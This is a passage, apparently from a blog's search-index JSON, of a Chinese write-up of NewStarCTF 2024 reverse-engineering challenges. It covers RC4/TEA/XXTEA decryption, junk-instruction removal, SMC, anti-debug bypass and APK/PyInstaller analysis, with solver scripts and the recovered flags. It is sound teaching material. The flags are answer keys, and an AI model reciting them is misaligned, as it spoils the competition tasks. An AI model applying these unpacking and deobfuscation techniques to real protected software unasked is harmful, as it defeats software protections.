data[i] ^= sbox[(sbox[a] + sbox[b])%256]; } for (int i = 0; i \u0026lt; length; i++) { printf(\u0026#34;%c\u0026#34;, data[i]); } } unsigned char* Initial_sbox(char* key) { unsigned char sbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { sbox[i] = i; } int length = strlen(key); unsigned char kbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { kbox[i] = key[i % length]; } int j = 0; for (int i = 0; i \u0026lt; 256; i++) { j = (j + sbox[i] + kbox[i]) % 256; swap((char*) \u0026amp; sbox[i], (char*) \u0026amp; sbox[j]); } return sbox; } int main() { char data[23] = { -60,96,-81,-71,-29,-1,46,-101,-11,16,86,81,110,-18,95,125,125,110,43,-100,117,-75,\u0026#39;\\0\u0026#39;}; char key[] = \u0026#34;NewStar\u0026#34;; unsigned char* sbox = (unsigned char*)malloc(sizeof(char) * 256); sbox = Initial_sbox(key); RC4_Decode(data, sbox); return 0; } 得到答案flag{Do_you_know_UPX?}\ndrink_TEA main函数内容如图，已经经过了一些修改。由memcmp函数可以判断出EncodeAnswer是加密过后的密文，由TEA加密算法的特征可以判断出aWelcometonewst是一个类似于密钥的字符串，for循环每次取input的八个字节传入TEA加密函数，在TEA函数里分成两个四字节进行加密。在这里不多赘述TEA算法的细节，密文在EncodeAnswer里面找到，TEA加密的具体内容如下图\n解密出来的结果是十六进制数，需要转换成可读的字符串\n这里有个大小端序的问题，其实这里传入解密函数的方式不是很对，正常是可以得到按顺序的flag的，下面给出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;stdio.h\u0026gt; void Decode(unsigned int* a1, unsigned int* a2 ,unsigned int* key, unsigned int Delta) { unsigned int sum = -32*Delta; for (int i = 0; i \u0026lt; 32; ++i) { *a2 -= (key[3] + ((*a1) \u0026gt;\u0026gt; 5)) ^ (sum + (*a1)) ^ (key[2] + ((*a1) \u0026lt;\u0026lt; 4)); *a1 -= (key[1] + ((*a2) \u0026gt;\u0026gt; 5)) ^ (sum + (*a2)) ^ (key[0] + ((*a2) \u0026lt;\u0026lt; 4)); sum += Delta; } } int main() { unsigned int Delta = 0x61C88647; unsigned int input[8]; unsigned int sum = 0; input[0] = 0xB3F72078; input[1] = 0xDACE42C5; input[2] = 0x1A215985; input[3] = 0x595A5626; input[4] = 0xED0D0229; input[5] = 0xEEB9A807; input[6] = 0x87115936; input[7] = 0x24235CFD; char key[17] = \u0026#34;WelcomeToNewStar\u0026#34;; for (int i = 0; i \u0026lt; 8 ; i+=2) { Decode(\u0026amp;input[i], \u0026amp;input[i+1], (unsigned int*)key, Delta); } for (int i = 0; i \u0026lt; 8; i++) { printf(\u0026#34;%x\u0026#34;, input[i]); } return 0; } 得到flag的16进制形式：67616c666568547b525f65724145545f4554585f6e615f4158585f647d414554\nPtrace 题目给了两个elf文件，PIE查了无壳\n这是这是father文件反编译后的内容，出现了一些没见过的函数经过查询可知\n所以可以知道ptrace函数往子进程的addr内存地址写入了一个整数3,查看IDA可以看到addr代表地址0x60004040\n打开子进程可以看到时进行了一个简单的加密操作，不难看出byte_60004020是密文数组，现在未知的只有\nnum_4这个变量，其实这个num_4就是前面addr的地址，所以他的值是3,接下来只要写exp就行了\n1 2 3 4 5 6 7 8 9 10 11 12 #include\u0026lt;stdio.h\u0026gt; int main() { int input[32] = { 204,141,44,236,111,136,237,235,47,237,174,235,78,172,44,141,141,47,235,109,205,237,238,235,14,142,78,44,108,172,231,175 }; for (int i = 0; i \u0026lt; 32; i++) { input[i] = (input[i] \u0026lt;\u0026lt; 3) | (input[i] \u0026gt;\u0026gt; 5); printf(\u0026#34;%c\u0026#34;, input[i]); } return 0; } flag{Do_you_really_know_ptrace?}\nezencrypt jadx打开，进入mainactivity，有用的信息只有开头的key数组，还有最下面读取了我们的输入并进行了判断\nenc是作者实现的一个类，估计就是加密函数了，check是enc类下的一个函数\n点进来能看到enc类的具体实现，可以看到第一个是总加密函数，第二个check函数实际上是调用的native方法中的一个so文件实现的，具体内容需要将apk解压之后用IDA打开so文件进行分析。第三个函数stringtokey是对我们前面找到的key密钥进行加密，用的是AES的加密算法。encrypt函数是对我们输入的加密函数，用的AES加密，ECB模式，PKCS5Padding模式。下面的decrypt函数则是解密函数，最后声明了ezencrypt.so文件。\n在IDA里我们能看到doEncCheck函数的具体实现，Java通过JNI传递我们的输入到c语言的函数中，不难看出mm数组是最终加密完成的密文，下面点进enc函数进行查看他对我们的输入进行了什么操作\n点进来看到它显示对我们的输入和key数组进行了异或操作，接着再对input和key数组通过rc4算法进行加密，所以我们相应的解密过程就是先rc4解密在和key数组异或就能得到明文，下面给出key数组和mm数组的具体内容\nexp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void swap(char* a1, char* a2) { char temp; temp = *a1; *a1 = *a2; *a2 = temp; } void RC4_Decode(char* data, unsigned char* sbox) { unsigned char a = 0; unsigned char b = 0; int length = 44; for (int i = 0; i \u0026lt; 44; i++) { b += sbox[++a]; swap((char*)\u0026amp;sbox[a], (char*)\u0026amp;sbox[b]); data[i] ^= sbox[(sbox[a] + sbox[b]) % 256]; } } unsigned char* Initial_sbox(char* key) { unsigned char sbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { sbox[i] = i; } int length = strlen(key); unsigned char kbox[256] = { 0 }; for (int i = 0; i \u0026lt; 256; i++) { kbox[i] = key[i % length]; } int j = 0; for (int i = 0; i \u0026lt; 256; i++) { j = (j + sbox[i] + kbox[i]) % 256; swap((char*)\u0026amp;sbox[i], (char*)\u0026amp;sbox[j]); } return sbox; } int main() { char data[45] = { 194,108,115,244,58,69,14,186,71,129,42,38,246,121,96,120,179,100,109,220,201,4,50,59,159,50,149,96,238,130,151,231,202,61,170,149,118,197,155,29,137,219,152,93,\u0026#39;\\0\u0026#39;}; char key[] = \u0026#34;meow\u0026#34;; unsigned char* sbox = (unsigned char*)malloc(sizeof(char) * 256); sbox = Initial_sbox(key); RC4_Decode(data, sbox); for (int i = 0; i \u0026lt; 44; i++) { data[i] ^= key[i % strlen(key)]; } for (int i = 0; i \u0026lt; 44; i++) { printf(\u0026#34;%c\u0026#34;, data[i]); } printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;以上结果为AES加密后转base64编码的结果\\n\u0026#34;); printf(\u0026#34;剩余结果请使用在线工具AES解密，选择ECB模式，pkcs7填充，密钥为\\\u0026#34;IamEzEncryptGame\\\u0026#34;\u0026#34;); return 0; } so层解密结果：2BB+GQampKmsrfDG85+0A7n18M+kT2zBDiZSO28Ich4=\n这是so层面的解密过程，别忘了还有Java层的加密，由于对Java语言还没那么熟悉，无法手搓解密代码，所以借用一下在线网站的解密工具，根据相应的模式可以得到flag{Ohh_U_knOw_7h15_5ki11}\nPangBai 泰拉记（1） IDA打开之后看到这样的界面，最显眼的就是粉色的isdebuggerpresent函数，这个函数是用来检测当前程序是否在被调试，如果调试则值为1反之为0，阅读程序逻辑可以发现程序有两段加密过程，经过尝试第一段加密过程得到的不是正确的flag，那么就尝试对第二段加密过程进行解密\nkey数组的内容是这样的\n直接编写解密代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { char temp[23] = \u0026#34;nhvviguMI?u\\\u0026#34;,o/fWivoM;\u0026#34;; temp[22] = 127; char temp1[] = \u0026#34;Homy2.l#{\u0026#34;; char flag[] = \u0026#34;can you find me can you find me?\u0026#34;; char key[] = \u0026#34;key1key2key3key4key6key7key8key9\u0026#34;; for (int i = 0; i \u0026lt; 32; i++) { if (i \u0026lt; 23) key[i] ^= temp[i]; else key[i] ^= temp1[i - 23]; } for (int i = 0; i \u0026lt; 32; i++) { flag[i] ^= key[i]; printf(\u0026#34;%c\u0026#34;, flag[i]); } return 0; } flag{my_D3bugg3r_may_1s_banned?}\nDirty_flowers 打开IDA是这样的，由题目的名字可以猜测代码被花指令干扰过了，根据提示我们可以找到汇编代码中的相应的retn指令和call $ + 5指令\n由于不太会用IDA的重定义，所以选择打开xdbg来nop掉这些花指令再打补丁\n找到相应花指令的位置，nop掉\n然后得到我们修补过后的main函数，可以看到就一个加密过程\nexp如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { char encrypted[36]; encrypted[0] = 2; encrypted[1] = 5; encrypted[2] = 19; encrypted[3] = 19; encrypted[4] = 2; encrypted[5] = 30; encrypted[6] = 83; encrypted[7] = 31; encrypted[8] = 92; encrypted[9] = 26; encrypted[10] = 39; encrypted[11] = 67; encrypted[12] = 29; encrypted[13] = 54; encrypted[14] = 67; encrypted[15] = 7; encrypted[16] = 38; encrypted[17] = 45; encrypted[18] = 85; encrypted[19] = 13; encrypted[20] = 3; encrypted[21] = 27; encrypted[22] = 28; encrypted[23] = 45; encrypted[24] = 2; encrypted[25] = 28; encrypted[26] = 28; encrypted[27] = 48; encrypted[28] = 56; encrypted[29] = 50; encrypted[30] = 85; encrypted[31] = 2; encrypted[32] = 27; encrypted[33] = 22; encrypted[34] = 84; encrypted[35] = 15; char key[] = \u0026#34;dirty_flower\u0026#34;; int length = strlen(key); for (int i = 0; i \u0026lt; 36; i++) { encrypted[i] ^= key[i % length]; printf(\u0026#34;%c\u0026#34;, encrypted[i]); } return 0; } flag{A5s3mB1y_1s_r3ally_funDAm3nta1}\nWeek 3 SMc_math 进来对main函数f5反编译一下，发现了有个循环对函数encrypt的地址和0x3E位与，并且调用了mprotect函数，查资料了解到这可能进行了smc混淆，并且直接点进enpcrypt函数会爆红\n更具特征的就是这一大段的数据块无法被读取，在网上学习别的大佬如何解smc混淆后，自己写了个idc脚本\n运行之后encrypt函数的汇编代码就出来了，接下来只要按U重定义一下再按C转换为代码，最后在函数头的位置按P就能得到到解混淆后的encrypt函数如下\n这是一个7元非线性方程组，要解的话需要用到z3约束求解器，由于没学过z3只能寻求ai的帮助，以下是exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from z3 import * # 创建Z3求解器 solver = Solver() # 声明变量v2到v8 v2 = BitVec(\u0026#39;v2\u0026#39;, 64) v3 = BitVec(\u0026#39;v3\u0026#39;, 64) v4 = BitVec(\u0026#39;v4\u0026#39;, 64) v5 = BitVec(\u0026#39;v5\u0026#39;, 64) v6 = BitVec(\u0026#39;v6\u0026#39;, 64) v7 = BitVec(\u0026#39;v7\u0026#39;, 64) v8 = BitVec(\u0026#39;v8\u0026#39;, 64) # 添加方程约束 solver.add(5 * (v3 + v2) + 4 * v4 + 6 * v5 + v6 + 9 * v8 + 2 * v7 == 0xD5CC7D4FF) solver.add(4 * v8 + 3 * v5 + 6 * v4 + 10 * v3 + 9 * v2 + 9 * v7 + 3 * v6 == 0x102335844B) solver.add(9 * v6 + 4 * (v5 + v4) + 5 * v3 + 4 * v2 + 3 * v8 + 10 * v7 == 0xD55AEABB9) solver.add(9 * v3 + 5 * v2 + 9 * v8 + 2 * (v4 + 2 * v5 + 5 * v6 + v7) == 0xF89F6B7FA) solver.add(5 * v6 + 9 * v5 + 7 * v2 + 2 * v3 + v4 + 3 * v8 + 9 * v7 == 0xD5230B80B) solver.add(8 * v8 + 6 * v5 + 10 * v4 + 5 * v3 + 6 * v2 + 3 * v7 + 9 * v6 == 0x11E28ED873) solver.add(v2 + 4 * (v4 + v3 + 2 * v5) + 9 * v6 + v7 + 3 * v8 == 0xB353C03E1) # 检查是否有解 if solver.check() == sat: model = solver.model() # 提取变量的解，并将其转换为16进制数输出 result = [model[v2].as_long(), model[v3].as_long(), model[v4].as_long(), model[v5].as_long(), model[v6].as_long(), model[v7].as_long(), model[v8].as_long()] # 将解转换为16进制数并输出 print([hex(r) for r in result]) else: print(\u0026#34;No solution found\u0026#34;) flag{D0_Y0u_Kn0w_sMC_4nD_Z3}\n取啥名好呢？ IDA打开发现无法f5反编译，是被加花过的\n定位到花指令的位置，看操作码原来应该是EB 2C跳转到某个地方，所以把这两个操作码放到一起即可\n修改后进到main函数，可以看到基本逻辑是通过setjmp函数的返回值来选择执行哪条语句\n这里贴出对应信号发生的返回值\n左边的函数列表还有个mian函数，里面定义了几个signal函数用来处理程序运行时出现错误的处理函数，基本看到这里就无法静态分析了，所以考虑用dbg来动态分析，由于是elf文件，所以用虚拟机远程调试。\n以下是调试结果，可以清楚的看到程序调用函数的顺序，后面会执行23次handle_func1就不截图了。\n通过调试＋分析可以得出程序运行的顺序：先运行发生报错SIGSEGV，接着运行handle_func2\n把dword_4068的地址赋值给qword_4060再在main函数中给qword_4060赋值233，其实就是给dword_4068赋值233，然后触发了SIGILL信号，是前面的花指令导致的信号，调用了handler函数，使main函数的Switch控制流跳转到case1\n接着触发了SIGFPE，其信号触发的根源在main函数的汇编代码中\n请看这段汇编代码，先用move指令把ecx寄存器的值改为0，然后再除以ecx的值，一个除法运算的除数不可以是0，而这却是0，所以触发了SIGFPE（浮点异常），并且可以注意到是在printf前面，说明main函数最下面那段for循环是可以执行到的，由于main函数每次运行到这里都会触发SIGFPE信号，所以会一直调用handle_func1函数直到dword_4168=22\n不难理解就是执行22次input[i] ^= i,sub_12E9函数是对我们的输入和密文进行比较\n逻辑分析到这里就结束了，下面贴出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include\u0026lt;stdio.h\u0026gt; int main() { char input[] = { 79,84,72,83,96,69,55,26,40,65,38,22,59,69,20,71,14,12,112,59,60,61,112,\u0026#39;\\0\u0026#39;}; for (int i = 0; i \u0026lt;23; i++) { input[i] ^= i; } for (int i = 0; i \u0026lt; 23; i++) { input[i] -= 233; } for (int i = 0; i \u0026lt; 23; i++) { printf(\u0026#34;%c\u0026#34;, input[i]); } return 0; } flag{WH47_C4N_1_54y???}\nsimpleAndroid jadx打开找到mainactivity，有几个关键信息：1.调用了simpleandroid这个so文件，并且调用了native方法showData。2.调用了Checkactivity方法里面的checkData函数，用来判断用户的输入。3.先对用户的输入调用native方法再调用check函数验证\n点进checkactivity类，可以看到调用了checkdata对我们的输入进行判断，所以接下来IDA打开so文件看checkdata函数的逻辑。\n找到checkdata函数，注意上面几个JNIenv的函数，是调用了com/example/simpleandroid/UseLess路径下的useless类，并且进行了一个base64的换表，经过仔细的分析和改名改类型能得到下面的代码\n整个加密过程的逻辑就是先把输入的数据以中间为对称轴前后交换，接着再对每个数据进行移位和位运算，最后得到密文data_1解密逻辑很简单直接给出exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; int main() { unsigned char input[] = { 178,116,69,22,71,52,149,54,23,244,67,149,3,214,51,149,198,214,51,54,167,53,230,54,150,87,67,22,150,151,230,22 }; for (int i = 0; i \u0026lt; 32; i++) { input[i] = ((int)input[i] \u0026gt;\u0026gt; 4) | (16 * input[i]); } unsigned char* temp_0; unsigned char temp; for (int i = 0; ; i++) { if (i \u0026gt;= 16) break; temp_0 = input; temp = input[i]; input[i] = input[32 - i - 1]; temp_0[32 - i - 1] = temp; } printf(\u0026#34;%s\u0026#34;, input); return 0; } 运行得到如下结果，把结果用base64解码就能得到flag（别忘了换表）\nflag{android_is_simple!}\no11vm 步入main函数，发现函数流程图长这样\n反编译以后\n发现有控制流平坦化特征，用 d810 去控制流平坦化\n变正常多了，进入函数，发现可疑数组\n可以用 IDA 插件，IDA 8.3 自带一个插件 findcrypt（或者一个个函数搜查）\n直接发现有 tea 特征\n找到 tea 特征，发现未魔改，字符串也提供了，找个脚本解密得 flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 #include \u0026lt;iostream\u0026gt; #include \u0026lt;string\u0026gt; #include \u0026lt;cstdint\u0026gt; using namespace std; void TEA_decrypt(uint32_t v[2], const uint32_t key[4]) { uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, delta = 0x9e3779b9; for (int i = 0; i \u0026lt; 32; i++) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + key[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + key[3]); v0 -= ((v1 \u0026lt;\u0026lt; 4) + key[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + key[1]); sum -= delta; } v[0] = v0; v[1] = v1; } string uint32_to_string(const uint32_t decrypted[8]) { string result; result.reserve(32); for (int i = 0; i \u0026lt; 8; ++i) { for (int j = 0; j \u0026lt; 4; ++j) { char byte = (decrypted[i] \u0026gt;\u0026gt; (8 * j)) \u0026amp; 0xFF; // 逐字节提取 result.push_back(byte); } } return result; } int main() { uint32_t key[4] = {0x11121314, 0x22232425, 0x33343536, 0x41424344}; uint32_t encrypted_flag[8] = {0x38b97e28, 0xb7e510c1, 0xb4b29fae, 0x5593bbd7, 0x3c2e9b9e, 0x1671c637, 0x8f3a8cb5, 0x5116e515}; for (int i = 0; i \u0026lt; 8; i += 2) { TEA_decrypt(\u0026amp;encrypted_flag[i], key); } string decrypted_flag = uint32_to_string(encrypted_flag); cout \u0026lt;\u0026lt; \u0026#34;Decrypted flag: \u0026#34; \u0026lt;\u0026lt; decrypted_flag \u0026lt;\u0026lt; endl; return 0; } flag{011vm_1s_eZ_But_C0MP1EX_!!} 注：本篇wp转自NewStarCTF官方wp，本文仅做转载记录\nflowering-shrubs 使用 IDA 可以看到程序完全无法分析。\n再仔细看汇编可以发现，题目似乎在随机位置处添加了同一个花指令。\n因此我们要使用 IDAPython 自动去除花指令。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # remove_flower.py import idc import idaapi startaddr=0x1100 endaddr=0x15FF lis=[0x50, 0x51, 0x52, 0x53, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x48, 0x81, 0xC3, 0x12, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x18, 0x48, 0x83, 0xC4, 0x18,0xC3] #这个for循环是关键点，检测以当前地址开始的27个字节是否符合lis列表的内容。 for i in range(startaddr,endaddr): flag=True for j in range(i,i+27): if idc.get_wide_byte(j)!=lis[j-i]: flag=False if flag==True: for addr in range(i,i+27): idc.patch_byte(addr,0x90) # 将这部分内容全部nop掉 for i in range(startaddr,endaddr):# 取消函数定义 idc.del_items(i) for i in range(startaddr,endaddr): # 添加函数定义 if idc.get_wide_dword(i)==0xFA1E0FF3: #endbr64 idaapi.add_func(i) lis 列表中的内容就是花指令的全部内容。\n在 IDA 中选择 File » Script file，选择该 Python 文件即可。\n或者在 File » Script command 中将上面的代码粘贴进来。\n之后再按下 F5 即可看到清晰的伪代码。\n部分函数我进行了重命名。在函数名位置处按下 N 即可重命名\n关键内容就是encrypt函数。\n这里是用了递归，一共 40 个字节，每四个字节为 1 组，一共 10 组，通过 get_next_rand 函数得到下一组加密字节。仔细分析一下即可写出脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #solve.py lis=[0x54,0xf4,0x20,0x47,0xfc,0xc4,0x93,0xe6,0x39,0xe0, 0x6e,0x00,0xa5,0x6e,0xaa,0x9f,0x7a,0xa1,0x66,0x39, 0x76,0xb7,0x67,0x57,0x3d,0x95,0x61,0x22,0x55,0xc9, 0x3b,0x4e,0x4f,0xe8,0x66,0x08,0x3d,0x50,0x43,0x3e] str=\u0026#34;uarefirst.\u0026#34; offset_buf=[0,4,32,12,8,24,16,20,28,36] #offset_buf就是通过动态调试提取出每一轮get_next_rand函数的返回值得到的 truekey=[] for i in str: truekey.append(ord(i)) def decrypt(offset,key): a=lis[offset] b=lis[offset+1] c=lis[offset+2] d=lis[offset+3] flagc=((c+key)\u0026amp;0xff)^b flagd=c^d flaga=a^d^key flagb=((b-key)\u0026amp;0xff)^flaga^key lis[offset]=flaga lis[offset+1]=flagb lis[offset+2]=flagc lis[offset+3]=flagd for i in range(10): decrypt(offset_buf[i],truekey[i]) print(bytes(lis).decode(\u0026#39;utf-8\u0026#39;)) # flag{y0u_C4n_3a51ly_Rem0v3_CoNfu510n-!!} flag{y0u_C4n_3a51ly_Rem0v3_CoNfu510n-!!} 注：本篇wp转自NewStarCTF官方wp，本文仅做转载记录\nSecretOfKawaii 程序在 Java 层有混淆，用 Jeb 可以简单去除，也可以通过断点调试弄清代码执行流程\nJava 层只有一个 RC4，key是 rc4k4y，加密后 Base64 一下传到 so 层，值在 so 层检查\nIDA 打开发现有 upx 的字符串，猜测是 upx 壳\n脱壳后\n一个 xxtea，密钥是 meow~meow~tea~~~\n写出对应的解密脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 #include \u0026#34;stdio.h\u0026#34; #include \u0026#34;string.h\u0026#34; #include \u0026#34;stdlib.h\u0026#34; typedef unsigned int uint32_t; #define size 256 unsigned char sbox[257] = {0}; // 初始化s表 void init_sbox(char *key) { unsigned int i, j, k; int tmp; for (i = 0; i \u0026lt; size; i++) { sbox[i] = i; } j = k = 0; for (i = 0; i \u0026lt; size; i++) { tmp = sbox[i]; j = (j + tmp + key[k]) % size; sbox[i] = sbox[j]; sbox[j] = tmp; if (++k \u0026gt;= strlen((char *)key)) k = 0; } } // 加解密函数 void rc4(char *key, char *data) { int i, j, k, R, tmp; init_sbox(key); j = k = 0; for (i = 0; i \u0026lt; strlen((char *)data); i++) { j = (j + 1) % size; k = (k + sbox[j]) % size; tmp = sbox[j]; sbox[j] = sbox[k]; sbox[k] = tmp; R = sbox[(sbox[j] + sbox[k]) % size]; data[i] ^= R; } } #define DELTA 0xdeadbeef #define MX (((z \u0026gt;\u0026gt; 5 ^ y \u0026lt;\u0026lt; 3) + (y \u0026gt;\u0026gt; 3 ^ z \u0026lt;\u0026lt; 2)) ^ ((sum ^ y) + (key[(p \u0026amp; 3) ^ e] ^ z))) void btea(uint32_t *v, int n, uint32_t const key[4]) { uint32_t y, z, sum; unsigned p, rounds, e; if (n \u0026gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do { sum += DELTA; e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = 0; p \u0026lt; n - 1; p++) { y = v[p + 1]; z = v[p] += MX; } y = v[0]; z = v[n - 1] += MX; } while (--rounds); } else if (n \u0026lt; -1) { n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do { e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3; for (p = n - 1; p \u0026gt; 0; p--) { z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); } } char base64[65] = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;; void decodeBase64(char *str, int len, char **in) { char ascill[129]; int k = 0; for (int i = 0; i \u0026lt; 64; i++) { ascill[base64[i]] = k++; } int decodeStrlen = len / 4 * 3 + 1; char *decodeStr = (char *)malloc(sizeof(char) * decodeStrlen); k = 0; for (int i = 0; i \u0026lt; len; i++) { decodeStr[k++] = (ascill[str[i]] \u0026lt;\u0026lt; 2) | (ascill[str[++i]] \u0026gt;\u0026gt; 4); if (str[i + 1] == \u0026#39;=\u0026#39;) { break; } decodeStr[k++] = (ascill[str[i]] \u0026lt;\u0026lt; 4) | (ascill[str[++i]] \u0026gt;\u0026gt; 2); if (str[i + 1] == \u0026#39;=\u0026#39;) { break; } decodeStr[k++] = (ascill[str[i]] \u0026lt;\u0026lt; 6) | (ascill[str[++i]]); } decodeStr[k] = \u0026#39;\\0\u0026#39;; *in = decodeStr; } int main() { // upx -d 解包libmeow1.so，加密只有一个xxtea，但是被魔改过，对照网上的代码修改可以解密 // 密文为64位数组，熟悉数据处理的话，直接指针传参就行了 long long secrets[6] = { 6866935238662214623LL, 3247821795433987330LL, -3346872833356453065LL, 1628153154909259154LL, -346581578535637655LL, 3322447116203995091LL }; // 不同编译器 long 的大小可能不同，用 long long 表示 64 位数据 // 为什么是 12？12 代表有 12 段 32 位数据（也就是6个long long类型数据)，负数时进行解密操作所以传 -12 btea((unsigned int *)secrets, -12, ( unsigned int *)\u0026#34;meow~meow~tea~~~\u0026#34;); char *flag; // 解 base64 decodeBase64((char *)secrets, strlen((char *)secrets), \u0026amp;flag); // 解 rc4 rc4(\u0026#34;rc4k4y\u0026#34;, (char *)flag); // 这里为了方便理解这么些，想方便可以直接 puts(flag); char *tmp = (char *)flag; for (size_t i = 0; i \u0026lt; 48; i++) { putchar(tmp[i]); } puts(\u0026#34;\u0026#34;); } flag{U_D0_Kn0w_Kawa11_P@n9_B@1} 注：本篇wp转自NewStarCTF官方wp，本文仅做转载记录\nPangBai过家家(3) 如果你用了 DIE，那应该会看到 PyInstaller 字样，这是一个 Python 库，能把 .py 脚本打包成 .exe. 如果你用 IDA 直接分析，里面大量的 Python 字样也是它的显著特征。当然，直接用 IDA 是难以分析 Python 脚本逻辑的。\n对于此种程序，解包方法很多，大家可以上网查关键词 PyInstaller 解包，资料也很多。我使用的是 PyInstaller Extractor.\n解包后得到一个目录。\n对于这个题，我们没有加密，也没有魔改 magic，也没有在库里面藏东西，所以说我们只关心和程序同名的 NotNormalExe.pyc. 反编译他看逻辑即可。\n反编译方法也有很多，如在线网站，或各种脚本，如 tool.lu/pyc.\n此处由于字节码的版本较高，前面会反编译出错，此时大家可以直接猜这是异或，或者用另一款工具 pycdas 去看机器码，然后找到关键的异或逻辑。\n本题其实对于没接触过的人来说主打一个猜，还有查询资料的能力。\n如果上面的东西没看懂，这篇文章可能会帮助你。\n注：本篇wp转自NewStarCTF官方wp，本文仅做转载记录\n","date":"2024-11-03T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202501011926775.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/newstarctf2024-writeup/","title":"NewStarCTF2024 WriteUp"},{"content":"待施工\u0026hellip;\u0026hellip;\n","date":"0001-01-01T00:00:00Z","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/","title":""}]